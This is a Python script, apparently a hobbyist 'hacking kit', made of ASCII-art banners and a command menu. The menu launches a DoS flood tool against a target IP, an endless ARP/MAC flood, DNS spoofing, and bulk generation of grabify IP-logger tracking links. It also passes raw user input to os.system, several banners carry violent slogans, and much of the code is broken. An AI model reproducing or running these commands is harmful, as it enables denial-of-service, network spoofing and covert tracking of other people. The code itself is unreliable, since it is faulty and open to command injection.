#!/bin/user/env python3
import os
import socket
import threading
import socket as s
import sys
import random
import string
import whois
import json
import urllib
from urllib.request import urlopen
import time
import requests
from scapy.all import *
from colorama import Fore, Style
# MENU
os.system("clear")
print ("""
[Welcome To The osIP Framework!]

Note: This Isnt A Racist/Supremacist Tool We Are Promoting Ending Racism And Supremacy!

(Zoom Out Completely For The Best CLI Experience)
Please Choose A CLI Theme:
 ---------------------------
|        T H E M E S        |
|-1- Drop The Blood Pyramid |
|-2- Swiss Army Knife       |
|-3- Standard Logo          |
|-4- Horizon                |
|-5- Matrix                 |
|-6- Hack The World         |
|-7- Anonymous              |
|-8- CryEyes                |
|-9- PlaneCrack             |
|-10- PoliceOSIP            |
|-11- Toxic Drop The Blood  |
|-12- Kill The Nazi's       |
|-13- Kill The KKK          |
|-14- Kill The KKK 2        |
|                           |
|99- exit - 1- default theme|
 ---------------------------
""")
mmenu = input ("[*] Choose Theme: ")
os.system("clear")
print (Style.BRIGHT + Fore.RED +"W E L - C O M E ")
time.sleep(0.5)
print ("======================================")
menu14 = ("""  
                ^^
                ||
                ||
                ||
                ||
                ||
                ||
           KILL THE KKK
   ============================
                ||
                ||
                ||
                ||
                ||
                ||    osIP-KIT
                ||
                ||
                ||
                ||
                ||
                ||
                ^^
    KILL THESE LITTLE KKK BUGS
""")
menu13 = ("""


                              /|
                             / |
                            /  |
                           /   \
                          /    |
                         /      \
                        /______  |
_ _       _            /|@/@ \_\__\
   \      \\          ///<__ / \  \\
     \_              //  \\_\|/ \___\\_
       \ ______     // __/\__/ /       \_
       /'-.____\____||/      \/          \_
      |    <|/\_\\   \  \     \            \
    _/       \\_\-\   |  \    /     \ \__   |
___/             \/_____/|    \      \_|    |
                          \   /        |    |
                          |\  \        |____|
                          \ \ /        /   |
                          |\  \        \`///
                          /   /            \
                         /    .             \
                        /     .              \
                       / /                    \_
                      /_/                      _\
                      | \      |              /
                      |  \_____|             / \
                      |    |   \____________/   \
                      |__  |               \     \
                   ___/____|              __\    _|
                   L____ __|              L____/`

                       KILL THE KKK
""")
menu12 = ("""
 [A L L  P E O P L E  D E S E R V E  T O  L I V E]

___¶¶__________________________________________¶__
__¶¶¶¶_______________________________________¶¶¶¶_
_¶¶¶¶¶¶¶_________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
__¶¶¶¶¶¶_______________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_
___¶¶¶¶¶¶______________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__
___¶¶¶¶¶¶_____________¶¶¶¶¶¶__________¶¶¶¶________
___¶¶¶¶¶¶_____________¶¶¶¶¶¶______________________
___¶¶¶¶¶¶_____________¶¶¶¶¶¶______________________
___¶¶¶¶¶¶_____¶¶¶_____¶¶¶¶¶¶______¶¶¶_____________
___¶¶¶¶¶¶____¶¶¶¶¶____¶¶¶¶¶¶_____¶¶¶¶¶____________
___¶¶¶¶¶_____¶¶¶¶¶____¶¶¶¶¶¶_____¶¶¶¶_____________
___¶¶¶¶¶______________¶¶¶¶¶¶______________________
___¶¶¶¶¶_______________¶¶¶¶¶______________________
___¶¶¶¶¶_______________¶¶¶¶¶______________________
___¶¶¶¶¶_______________¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____
___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____
___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___
____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶___
________¶¶¶¶¶¶¶¶¶¶_____¶¶¶¶¶¶_____________¶¶¶¶¶___
________________________¶¶¶¶¶_____________¶¶¶¶¶___
________________________¶¶¶¶¶_____________¶¶¶¶¶___
_____________¶¶¶¶_______¶¶¶¶¶_____¶¶¶_____¶¶¶¶¶___
_____________¶¶¶¶¶______¶¶¶¶¶____¶¶¶¶¶____¶¶¶¶¶___
_____________¶¶¶¶_______¶¶¶¶¶¶___¶¶¶¶_____¶¶¶¶¶___
________________________¶¶¶¶¶_____________¶¶¶¶¶___
________________________¶¶¶¶¶_____________¶¶¶¶¶___
________________________¶¶¶¶¶_____________¶¶¶¶¶___
______¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____________¶¶¶¶¶¶__
___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______________¶¶¶¶¶¶__
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________________¶¶¶¶¶¶_
¶¶¶¶¶¶¶¶____________________________________¶¶¶¶¶¶
__¶¶¶________________________________________¶¶¶¶_


          [ B U R N  T H E  N A Z ! S]
""")
menu11 = ("""
                                               osIP-Framework
                         __    _                                   
                    _wr""        "-q__                             
                 _dP                 9m_     
               _#P                     9#_                         
              d#@                       9#m                        
             d##                         ###                       
            J###                         ###L                      
            {###K                       J###K                      
            ]####K      ___aaa___      J####F                      
        __gmM######_  w#P""   ""9#m  _d#####Mmw__                  
     _g##############mZ_         __g##############m_               
   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_             
  a###""          ,Z"#####@" '######"\g          ""M##m            
 J#@"             0L  "*##     ##@"  J#              *#K           
 #"               `#    "_gmwgm_~    dF               `#_          
7F                 "#_   ]#####F   _dK                 JE          
]                    *m__ ##### __g@"                   F          
                       "PJ#####LP"                                 
 `                       0######_                      '           
                       _0########_                                   
     .               _d#####^#####m__              ,              
      "*w_________am#####P"   ~9#####mw_________w*"                  
          ""9@#####@M""           ""P@#####@M""                    


                 [D R O P  T H E  B L O O D]
""")
menu10 = ("""
                       _____________________
    /  .       .      (<$$$$$$>#####<::::::>)
   .      .     .  _/~~~~~~~~~~~~~~~~~~~~~~~~~\_   .       .   .   \
.(          . .  /~                             ~\ . .   .
  ( . .        .~                                 ~.      .         )
           ()\/_____                           _____\/()   .    .  ).
(         .-''      ~~~~~~~~~~~~~~~~~~~~~~~~~~~     ``-.  ...
.  . . .-~              __________________              ~-.  .    /
 .   ..`~~/~~~~~~~~~~~~TTTTTTTTTTTTTTTTTTTT~~~~~~~~~~~~\~~'    . ) .
    . .| | | #### #### || | | | [] | | | || #### #### | | | .
   (   ;__\|___________|++++++++++++++++++|___________|/__;.   .
     .  (~~====___________________________________====~~~)
 ( .  .. \------_____________[ OSIP1 ]__________-------/ ..  .     )
         .  |      ||         ~~~~~~~~       ||      |
             \_____/                          \_____/
""")
menu9 = ("""
---------------------------------
        [osIP-Framework]
            ____
  |        | ___\          /~~~|
 _:_______|/'(..)`\_______/  | |
<_|``````  \__~~__/  osIP ___|_|
  :\_____(=========,(*),--\__|_/
  |       \ Ahmad /---'
           | (*) /
           |____/
            ``
            ``
           [==)

        [Hack The World]
---------------------------------
""")
menu8 = ("""


                ████████████              
            ████            ████          
          ██                    ██        
        ██                        ██      
      ██                            ██    
      ██                            ██    
    ██                                ██  
    ██                                ██  
    ██                                ██  
    ██    ██████            ██████    ██  
  ██    ████  ██████    ██████▒▒████    ██
  ██        ▒▒▓▓            ▓▓▒▒        ██
  ██  ▒▒▒▒  ▒▒▒▒            ▓▓▒▒  ▒▒▒▒  ██
  ██  ▒▒▒▒  ▒▒▓▓            ▒▒▒▒  ▒▒▒▒  ██
  ██  ▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒  ██
    ██    ████████████████████████    ██  
    ██      ████████████████████      ██  
      ██    ████████████████████    ██    
      ██      ████████████████      ██    
        ██      ▒▒▒▒▒▒▒▒▒▒▒▒      ██      
          ██                    ██        
            ████            ████          
                ████████████              
                                   [Say Cheese ;)]
---------------------------------------------------------------------------------------------------

""")
menu7 = ("""
---------------------------------------------------------------------------------------------------
                        ░░░░░░░░░░░░░░░░░░░░░░                    
                ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░              
            ░░░░░░░░      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒        
        ░░░░░░░░                  ░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒    
      ░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒  
    ░░░░░░░░░░░░░░                  ░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒  
    ░░░░░░░░░░░░░░░░░░              ░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒
    ░░░░░░  ░░        ░░            ░░  ░░░░░░░░░░▒▒▒▒▒▒░░░░▒▒▒▒▒▒
  ░░░░░░░░▓▓██▓▓▒▒░░░░  ░░              ░░▒▒▓▓▓▓██▓▓▓▓▓▓██▓▓▒▒▒▒▒▒
    ░░▒▒░░░░░░░░▒▒▒▒░░░░░░          ░░████████░░░░░░░░░░░░░░▒▒▒▒▒▒
  ░░░░░░░░        ░░▒▒▓▓▓▓          ▓▓██▒▒░░  ░░░░░░░░░░░░░░▒▒▒▒▒▒
  ▒▒░░░░            ░░░░▓▓          ▓▓░░░░    ░░░░  ░░░░░░░░▒▒▒▒▒▒
  ▒▒░░░░              ░░░░          ░░░░      ░░░░░░░░░░░░░░▒▒▒▒▒▒
  ▒▒░░░░░░            ░░░░        ░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒
  ░░░░░░░░░░    ░░░░░░░░          ░░░░░░░░░░▓▓██████▓▓░░░░▒▒▒▒▒▒▒▒
  ░░░░░░░░▒▒██████████░░          ░░░░░░████████████████░░▒▒▒▒▒▒▒▒
  ░░░░░░░░██████████▓▓▓▓          ░░░░░░██████████████▓▓░░░░░░▒▒▒▒
  ░░░░░░░░░░▓▓██▓▓▒▒░░            ░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒
  ░░░░░░░░░░░░░░░░                ░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒
  ░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒
  ░░░░░░░░░░░░                  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒
  ░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓
  ░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▓▓
  ░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒
  ░░░░░░░░░░░░  ░░░░░░            ░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒  
    ░░░░░░░░░░░░                  ░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒░░▒▒  
    ▒▒  ▒▒▒▒░░        ░░          ░░░░░░░░░░░░░░░░░░░░░░██░░▒▒▒▒  
    ▒▒░░░░██░░          ░░░░░░  ░░░░▒▒░░░░░░░░░░░░░░░░▓▓▓▓░░▒▒▒▒  
    ░░░░░░▓▓▒▒            ░░██▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░▒▒██▒▒░░▒▒    
    ░░░░  ░░██▒▒      ░░▒▒▓▓▓▓▒▒░░▓▓▓▓▓▓░░░░░░░░░░▓▓██▒▒▒▒▒▒▒▒    
      ░░░░  ░░▓▓▓▓▓▓▒▒▓▓▓▓▒▒▓▓░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░▒▒░░▒▒▒▒    
      ░░░░  ░░░░▓▓▓▓▓▓▓▓▓▓▓▓░░    ░░██▒▒▓▓▓▓▓▓▒▒░░░░▒▒░░▒▒▒▒      
      ░░░░░░  ░░    ░░░░██▒▒▒▒▒▒▒▒▓▓▓▓▓▓░░░░░░░░░░▒▒░░░░▒▒▒▒      
        ░░░░░░  ░░░░              ░░░░░░░░░░░░▒▒▒▒▒▒░░▒▒▒▒        
          ░░░░░░░░░░░░░░░░          ░░░░░░▒▒░░▒▒▒▒░░▒▒▒▒          
              ░░░░░░░░░░    ▒▒▓▓▓▓██▒▒░░░░░░░░▒▒░░▒▒▒▒            
              ░░░░░░░░░░░░░░  ██████░░░░░░░░▒▒░░▒▒▒▒              
                ░░░░░░░░      ▓▓██▓▓░░░░░░░░▒▒▒▒▒▒▒▒              
                  ░░░░░░░░  ░░▓▓████░░░░░░░░▒▒▒▒▒▒                
                    ░░░░░░░░░░▓▓██▓▓░░░░░░▒▒▒▒░░                  
                      ░░░░░░░░██████░░░░░░▒▒                      
                        ░░░░░░▓▓████▒▒░░▒▒                        
                          ░░░░▒▒████▒▒▒▒                          
                              ░░██▓▓░░                            

                               [We Are Anonymous]
---------------------------------------------------------------------------------------------------
""")
menu6 = ("""
 ===============================
|        [Hack The World]       |
|                               |
|xxxx.IP.xxxx.DNS.xxxx.MAC.xxxx.|
|xxxx.DOX.xxxx.BRUTEFORCE.xxxx. |
|xxxx.DORK.xxxx.SQL.xxxx.MALWARE|
|xxxx.DUCKY.xxxx.GITHUB.xxxx.   |
|MITM.xxxx.KALI.xxxx.SSH.xxxx.  |
|                               |
 ===============================
""")
menu4 = ("""
---------------------------------
*            *   *      *     _//
     *         *    *      * / \\
  *       *  *      *        \\_/
    *          *     *      
 *             *         *
*     *   *        *      
the horizon
*  *        *    *        * *   
  *    * *          * * *
*   *        *   *         *

### hack the world ###### ########
#################################
##########################################$#######################
#################################
---------------------------------
""")
menu3 = ("osIP-KIT")
menu2 = ("""

           
          /
         /**
        /****  ~`osIP-Kit`~
       /******
      /********
     /**********
    /************
   /drop the blood
   •–––––––––––––––•
""")
menu = ("""
        .-..
       / | \\
       |---||     ~`'osIP-Kit'`~
       |---||
       |---||
   .---^ - ^---..
   : O S I P   ::
   : T - K I T ::
   :___________::
      |  |//||
      |  |//||
      |  |//||
      |  |//||
      |  |//||
      |  |//||
      |  |.-||
      |.-'**||
      \*****//
       \***//
        \*//
         V/

        ' '
         ^'
        (_)
        
  Hack The World
        """)
if mmenu == "1":
	print (menu2)
if mmenu == "2":
	print (menu)
if mmenu == "3":
	print (menu3)
if mmenu == "4":
	print (menu4)
if mmenu == "5":
	os.system("clear")
	print (Style.BRIGHT + Fore.GREEN +"MATRIX")
	print ("""
-------------------------------
0 1 0 1 0 0 1 1 0 1 1 1 1 0 1 1
1 0 1 1 1 0 0 1 0 1 0 0 1 0 1 0
1 0 0 1 I ❤ MATRIX 0 1 0 1 1 0 1
0 1 1 0 1 0 1 0 1 0 1 0 1 0 0 1
0 1 0 0 1 0 0 1 0 0 1 0 1 0 1 0
--------------------------------
Fun Fact: I Was Inspired By The Matrix <3
""")
if mmenu == "6":
	print (menu6)
if mmenu == "7":
	print (menu7)
if mmenu == "8":
	print (menu8)
if mmenu == "9":
	print (menu9)
if mmenu == "10":
	print (menu10)
if mmenu == "11":
	print (menu11)
if mmenu == "12":
	print (menu12)
if mmenu == "13":
	print (menu13)
if mmenu == "14":
	print (menu14)
if mmenu == "99":
	print ("Goodbye")
	exit()
time.sleep(0.5)
creditss = ("""######################################
Made By Ahmad
Replit: @AhmadTheWeirdo
YouTube: Black Magic
Type Help To See All Commands
######################################""")
print (creditss)
time.sleep(0.5)
# VARIABLES
value = random.uniform(1, 999999)
choice = input("[*] ")
ping = ""
ipflood = ""
# COMMANDS
def cxode(length=6):
	charset = string.ascii_letters+string.digits
	return''.join(random.choice(charset) for i in range (length))
def ask():
  choice = input("[*] ")
if choice == "ping":
    ipp = input("[*] Enter The IP Address/Hostname That You Want To Ping: ")
    os.system("ping "+ipp)
    ask()
elif choice == "gen":
	f= open("glinks.txt","w+")
	while 1==1:
		code = cxode(6)
		url = ("https://grabify.link/track/"+code)
		print ("[*] Generating...")
		print ("[*] Whenever You Would Like Just Press CTRL+C Then Check The glinks.txt File!")
		f.write(url)
elif choice == "ipflood":
	print ("[*] Please Note: Due To Anonymous Making The Saphyra Tool Ages Ago Its Made In Python 2 So Python 2 Is Required!, Forgot To Mention Saphyra Requires A Good Device Because It Sends A Attack Signal To 5k Useragents Which Makes The Device Lag!")
	ipdos = input("[*] Input Target's IP Address:  ")
	os.system("python2 saphyra.py "+ipdos)
elif choice == "nmap":
	nmapip = input("[*] Enter The IP You Want To Check: ")
	os.system("nmap "+nmapip)
	ask()
elif choice == "help":
	print ("""
 -------------------------------
|       H E L P - L I S T       |
| ----------------------------- |
| install - install the modules |
| req - install the python reqs |
| checkua - posts all useragents|
| nmap - checks ip for vulns    |
| iplookup - doxxes ip          |
| ipflood - sends packets to ip |
| macfl - sends packets to mac  |
| ping - tests if server is ok  |
| request - same as ping        |
| ncat - reverseshell host      |
| ssh - sshs into clients pc    |
| compile - compile file to exe |
| clear - clears screen (unix)  |
| gen - generates grabify codes |
| credits - posts credits       |
| fun - posts fun fact          |
| dns - spoofs dns from a server|
 -------------------------------
	""")
	ask()
elif choice == "dns":
	os.system("sudo python spoof.py")
elif choice == "request":
	rserver = input("[*] Enter Server: ")
	done = False
	r=requests.get(rserver).status_code
	done = True
	if done == True:
		if status_code == "404":
			print ("Website Forbidden")
		if status_code == "200":
			print ("Website Is Up!")
		if status_code == "410":
			print ("Website Is Deleted")
		ask()
elif choice == "checkua":
	os.system("clear")
	os.system("curl https://raw.githubusercontent.com/laorynas/Saphyra/master/lists/useragents.txt")
	ask()
elif choice == "exit":
	print ("[*] Thanks For Using osIP-Kit. <3")
	exit()
elif choice == "compile":
	os.system("pyinstaller --onefile main.py")
	ask()
elif choice == "ssh":
	print ("example: kali@192.168.0.0")
	ipssh = input("[*] Enter The SSH Client's Username: ")
	os.system("ssh "+ipssh)
	ask()
elif choice == "req":
	os.system("sudo pip3 install scapy pyfiglet colorama pyfiglet requests pyinstaller")
elif choice == "credits":
	print ("""
	Made By Ahmad
	Made For Educational Purposes Only/ Penetration Testing
	""")
	ask()
elif choice == "install":
	print ("[*] Installing...")
	done = False
	os.system("sudo apt-get nmap netcat python2")
	ask()
	ask()
	if done == True:
		print ("[*] Restarting Device...")
		os.system("sudo reboot")
		ask()
elif choice == "iplookup":
	ippp = input("[*] Input IP Address: ")
	w = whois(ippp)
	print (w)
	ask()
elif choice == "macflood":
    while 1:
    	sendp(Ether(src=RandMAC(),dst=input("[*] Enter The Target's Mac Address: ")/ARP(op=2, psrc="0.0.0.0", hwdst=input("[*] Enter Your Mac Address: "))/Padding(load="X"*18)))
    	ask()
elif choice == "ncat":
	iplisten = input("[*] Enter The IP Listener: ")
	os.system("nc -l "+iplisten)
	ask()
elif choice == "clear":
	os.system("clear")
	print (creditss)
	ask()
elif choice == "fun":
	print ("""
Fun Fact: 
I Made This Script To Stop Some People From Calling Me 
Harmless/Script Kiddie 
Which I Spent More Than A Whole Week To Finish This Script
With No Sleep""")
	ask()
else:
	ask()
ask()
